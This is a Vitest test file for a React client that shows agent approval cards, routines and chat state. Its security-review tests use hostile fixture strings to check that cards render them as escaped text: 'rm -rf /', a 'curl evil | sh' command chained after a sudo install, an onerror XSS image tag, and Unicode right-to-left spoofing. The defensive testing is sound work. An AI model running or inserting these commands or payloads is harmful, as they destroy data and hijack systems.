import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen, waitFor } from "@testing-library/react";
import { SecretStore, type ClientFrame, type ConnectionEvent, type FrameTransport, type HealthReport, type JobInfo } from "@agni/client";
import { AppModel } from "../src/state/app-model";
import { silentNotifications } from "../src/state/notifications";
import { AppModelProvider } from "../src/state/use-app-model";
import { RootView } from "../src/components/RootView";
import { InspectorView } from "../src/components/InspectorView";
import { ApprovalRulesView } from "../src/components/ApprovalRulesView";
import { AgentProfileView } from "../src/components/AgentProfileView";
import { ChatGPTConnectionView } from "../src/components/ChatGPTConnectionView";

const health: HealthReport = {
  ok: true, v: 2, serverTime: new Date().toISOString(), uptimeMs: 90_000, seq: 1, providers: [],
  usageToday: { turns: 0, inputTokens: 0, outputTokens: 0 },
};

function idleTransport(): FrameTransport {
  return { open: () => new Promise<void>(() => undefined), send: async () => undefined, receive: () => new Promise<string>(() => undefined), close: async () => undefined };
}

function rig() {
  SecretStore.save("test-token");
  const model = new AppModel({ makeTransport: idleTransport, healthFetch: async () => health, notifier: silentNotifications, healthPollMs: 0 });
  model.start();
  const sent: ClientFrame[] = [];
  const inner = model as unknown as { connection: unknown; connectionState: unknown };
  inner.connection = { send: async (frame: ClientFrame) => void sent.push(frame), retryNow: () => undefined };
  inner.connectionState = { kind: "ready", lastSeq: 0 };
  return { model, sent };
}

function frame(model: AppModel, value: unknown): void {
  act(() => (model as unknown as { handleFrame: (value: unknown) => void }).handleFrame(value));
}

function event(model: AppModel, value: ConnectionEvent): void {
  act(() => (model as unknown as { handle: (value: ConnectionEvent) => void }).handle(value));
}

function renderWith(model: AppModel, view: React.ReactElement) {
  return render(<AppModelProvider model={model}>{view}</AppModelProvider>);
}

function bind(model: AppModel): void {
  frame(model, { type: "conversation.ok", seq: 1, conversationID: "cnv_1", agentID: "ea", sessionID: "thr_1" });
}

beforeEach(() => {
  localStorage.clear();
  SecretStore.memoryToken = null;
});

afterEach(() => {
  cleanup();
  localStorage.clear();
  SecretStore.memoryToken = null;
  vi.restoreAllMocks();
});

describe("a tab left open across a server restart (exit test P1)", () => {
  it("drops the dead turn, the Stop button and the dead cards, and keeps cards the new process re-sent", async () => {
    const { model, sent } = rig();
    bind(model);
    frame(model, { type: "turn.start", seq: 2, turnID: "trn_1", threadID: "thr_1", agentID: "ea", conversationID: "cnv_1" });
    frame(model, { type: "token", seq: 3, turnID: "trn_1", threadID: "thr_1", delta: "mid-sentence" });
    frame(model, { type: "approval.request", seq: 4, requestID: "apr_dead", action: "shell: ls", preview: "", buttons: ["once"] });
    frame(model, { type: "agent.presence", seq: 5, agentId: "ea", state: "working" });
    renderWith(model, <RootView />);
    expect(screen.getByRole("button", { name: "Stop" })).toBeInTheDocument();
    expect(screen.getByText("Writing…")).toBeInTheDocument();

    // The loop reconnects: hello is sent, the new process re-sends the one live card, then says it cannot replay.
    event(model, { type: "state", state: { kind: "handshaking" } });
    event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
    frame(model, { type: "approval.request", seq: 5, requestID: "apr_live", action: "shell: pwd", preview: "", buttons: ["once"] });
    sent.length = 0;
    event(model, { type: "durableReloadRequired", restarted: true });

    expect(screen.queryByRole("button", { name: "Stop" })).not.toBeInTheDocument();
    expect(screen.queryByText("Writing…")).not.toBeInTheDocument();
    expect(model.getSnapshot().conversation.approvals.map((card) => card.id)).toEqual(["apr_live"]);
    expect(model.getSnapshot().conversation.messages.some((message) => message.state.kind === "streaming")).toBe(false);
    // And the history is asked for again.
    await waitFor(() => expect(sent.some((item) => item.type === "conversation.history")).toBe(true));
  });

  it("does not let tokens queued before the restart bring the dead turn back", async () => {
    const { model } = rig();
    bind(model);
    frame(model, { type: "turn.start", seq: 2, turnID: "trn_1", threadID: "thr_1", agentID: "ea", conversationID: "cnv_1" });
    // These are still waiting for the next animation frame when the connection is lost and re-made.
    frame(model, { type: "token", seq: 3, turnID: "trn_1", threadID: "thr_1", delta: "queued" });
    event(model, { type: "state", state: { kind: "handshaking" } });
    event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
    event(model, { type: "durableReloadRequired", restarted: true });
    // The error frame that follows flushes the token queue before it is applied.
    frame(model, { type: "error", seq: 4, code: "resync_gap", message: "cannot replay" });
    await new Promise((resolve) => setTimeout(resolve, 60));
    expect(model.getSnapshot().conversation.isStreaming).toBe(false);
    expect(model.getSnapshot().conversation.messages.some((message) => message.state.kind === "streaming")).toBe(false);
  });

  it("also clears everything when the daemon answers resync_gap", () => {
    const { model } = rig();
    bind(model);
    frame(model, { type: "turn.start", seq: 2, turnID: "trn_1", threadID: "thr_1", agentID: "ea", conversationID: "cnv_1" });
    frame(model, { type: "form.request", seq: 3, requestID: "frm_dead", question: "Which?", options: ["a"], kind: "choice" });
    // The loop reconnects, then reports the gap as an event and passes the error frame on.
    event(model, { type: "state", state: { kind: "handshaking" } });
    event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
    event(model, { type: "durableReloadRequired", restarted: true });
    frame(model, { type: "error", seq: 4, code: "resync_gap", message: "cannot replay from 1" });
    expect(model.getSnapshot().conversation.isStreaming).toBe(false);
    expect(model.getSnapshot().conversation.forms).toHaveLength(0);
  });
});

describe("the routine list (exit test P3)", () => {
  function job(partial: Partial<JobInfo> & { id: string; kind: string }): JobInfo {
    return { state: "queued", runAt: "2026-11-17T09:00:00.000Z", enabled: true, attempts: 0, internal: false, ...partial };
  }
  const titles = () => [...document.querySelectorAll(".routine-title")].map((node) => node.textContent);

  it("keeps its order when the daemon lists the jobs in a different one", () => {
    const { model } = rig();
    const a = job({ id: "j_a", kind: "turn", title: "Alpha" });
    const b = job({ id: "j_b", kind: "turn", title: "Bravo" });
    const c = job({ id: "j_c", kind: "turn", title: "Charlie" });
    frame(model, { type: "job.list.ok", seq: 1, jobs: [c, a, b] });
    renderWith(model, <InspectorView />);
    expect(titles()).toEqual(["Alpha", "Bravo", "Charlie"]);

    // One starts running and the daemon re-sorts by state and next run: nothing moves.
    frame(model, { type: "job.list.ok", seq: 2, jobs: [{ ...b, state: "running" }, c, { ...a, runAt: "2026-11-18T09:00:00.000Z" }] });
    expect(titles()).toEqual(["Alpha", "Bravo", "Charlie"]);
  });
});

describe("copy (exit test P4)", () => {
  it("does not claim there is no step cap", () => {
    const { model } = rig();
    const { container } = renderWith(model, <InspectorView />);
    expect(container.textContent).not.toMatch(/no step cap/);
    expect(container.textContent).toMatch(/48 steps/);
  });

  it("names the Stop shortcut for the platform", () => {
    const { model } = rig();
    bind(model);
    frame(model, { type: "turn.start", seq: 2, turnID: "trn_1", threadID: "thr_1", agentID: "ea", conversationID: "cnv_1" });
    vi.spyOn(navigator, "platform", "get").mockReturnValue("Win32");
    renderWith(model, <RootView />);
    const title = screen.getByRole("button", { name: "Stop" }).getAttribute("title") ?? "";
    expect(title).toContain("Ctrl+.");
    expect(title).not.toContain("⌘");
  });

  it("disables 'Continue with ChatGPT' when the server says sign-in is disabled", () => {
    const { model } = rig();
    frame(model, {
      type: "provider.auth.state", seq: 1, providerID: "chatgpt",
      connection: { status: "disconnected", accounts: [], activeAccountID: null, model: "", models: [], message: "ChatGPT sign-in is disabled (set AGNI_CHATGPT=1)" },
    });
    act(() => (model as unknown as { publish: () => void }).publish());
    renderWith(model, <ChatGPTConnectionView />);
    expect(screen.getByRole("button", { name: /Continue with ChatGPT/ })).toBeDisabled();
  });

  it("shows readable names, not internal ids, in the panel and the profile", () => {
    const { model } = rig();
    const roster = [{ id: "ea", name: "Friday", tools: [] }];
    frame(model, { type: "agents.update", seq: 1, agents: roster, mentions: roster });
    frame(model, {
      type: "job.list.ok", seq: 2,
      jobs: [{ id: "j1", kind: "task.reminder", state: "queued", runAt: "2026-11-17T09:00:00.000Z", enabled: true, attempts: 0, internal: false, lastResult: "thread thr_9f3a-77: nothing to report" }],
    });
    const { container } = renderWith(model, <InspectorView />);
    expect(container.textContent).not.toContain("task.reminder");
    expect(container.textContent).not.toContain("thr_9f3a-77");
    expect(container.textContent).toContain("Task reminder");
    cleanup();
    const profile = renderWith(model, <AgentProfileView />);
    expect(profile.container.textContent).not.toMatch(/by ea\b/);
  });

  it("names the bot on a replayed card when exactly one bot is waiting for the owner", () => {
    const { model } = rig();
    const roster = [{ id: "ea", name: "Friday", tools: [] }, { id: "scout", name: "Scout", tools: [] }];
    frame(model, { type: "agents.update", seq: 1, agents: roster, mentions: roster });
    frame(model, { type: "agent.presence", seq: 2, agentId: "scout", state: "waiting" });
    frame(model, { type: "approval.request", seq: 3, requestID: "apr_1", action: "shell: ls", preview: "", buttons: ["once"] });
    renderWith(model, <RootView />);
    expect(screen.getByText("Scout wants to run something")).toBeInTheDocument();
  });

  it("stays neutral when no single bot can be named", () => {
    const { model } = rig();
    frame(model, { type: "approval.request", seq: 3, requestID: "apr_1", action: "shell: ls", preview: "", buttons: ["once"] });
    renderWith(model, <RootView />);
    expect(screen.getByText("A bot wants to run something")).toBeInTheDocument();
  });
});

describe("card text is escaped and drawn as text (security review)", () => {
  const RLO = String.fromCodePoint(0x202e);
  const ZWSP = String.fromCodePoint(0x200b);
  const BS = String.fromCodePoint(92);

  it("shows a rule's target with visible escapes and a cap, never raw control characters", () => {
    const { model } = rig();
    act(() => (model as unknown as { publish: () => void }).publish());
    renderWith(model, <ApprovalRulesView />);
    frame(model, {
      type: "approval.rules.list.ok", seq: 1,
      rules: [
        { id: "r1", agentID: "ea", agentName: "Friday", toolName: "bash", target: `echo ok
rm -rf /${RLO}txt.exe${ZWSP}`, createdAt: "2026-11-10T10:00:00.000Z" },
        { id: "r2", agentID: "ea", agentName: "Friday", toolName: "write_file", target: "p".repeat(600), createdAt: "2026-11-10T10:00:00.000Z" },
      ],
    });
    const text = document.body.textContent ?? "";
    expect(text).toContain(`echo ok${BS}nrm -rf /${BS}u202Etxt.exe${BS}u200B`);
    expect(text).not.toContain(RLO);
    expect(text).not.toContain(ZWSP);
    expect(text).toContain("characters not shown");
  });

  it("escapes the password prompt's purpose and command", () => {
    const { model } = rig();
    frame(model, { type: "secret.request", seq: 1, requestID: "sec_1", purpose: `Install${RLO}gnp.exe`, command: `sudo apt install x
; curl evil | sh${ZWSP}`, kind: "password", expiresAt: "2030-01-01T00:00:00.000Z" });
    const { container } = renderWith(model, <RootView />);
    const card = container.querySelector(".secret-card")!;
    expect(card.textContent).toContain(`Install${BS}u202Egnp.exe`);
    expect(card.textContent).toContain(`sudo apt install x${String.fromCodePoint(10)}; curl evil | sh${BS}u200B`);
    expect(card.textContent).not.toContain(RLO);
    expect(card.textContent).not.toContain(ZWSP);
  });

  it("escapes every field of the email draft card and shows markup as text", () => {
    const { model } = rig();
    frame(model, {
      type: "form.request", seq: 1, requestID: "frm_1", question: "Send this?", kind: "email",
      email: { from: `me@x.test${ZWSP}`, to: `boss@x.test${RLO}moc.evil`, subject: "<b>Re</b>: **hi**", body: `Line one
Line two${RLO}<img src=x onerror=alert(1)>` },
    });
    const { container } = renderWith(model, <RootView />);
    const card = container.querySelector(".email-card")!;
    expect(card.textContent).not.toContain(RLO);
    expect(card.textContent).not.toContain(ZWSP);
    expect(card.textContent).toContain(`boss@x.test${BS}u202Emoc.evil`);
    expect(card.textContent).toContain("<b>Re</b>: **hi**");
    expect(card.querySelector("img, b, strong")).toBeNull();
    expect(card.textContent).toContain(`Line two${BS}u202E<img src=x onerror=alert(1)>`);
  });

  it("escapes a question card's text and options and an approval card's action and preview", () => {
    const { model } = rig();
    frame(model, { type: "form.request", seq: 1, requestID: "frm_1", question: `Pick${RLO} one`, options: [`A${ZWSP}`, "B"], kind: "choice" });
    frame(model, { type: "approval.request", seq: 2, requestID: "apr_1", action: `shell:${RLO}ls`, preview: `line1
line2${ZWSP}`, buttons: ["once"] });
    const { container } = renderWith(model, <RootView />);
    expect(container.textContent).not.toContain(RLO);
    expect(container.textContent).not.toContain(ZWSP);
    expect(container.textContent).toContain(`Pick${BS}u202E one`);
    expect(container.textContent).toContain(`shell:${BS}u202Els`);
  });
});
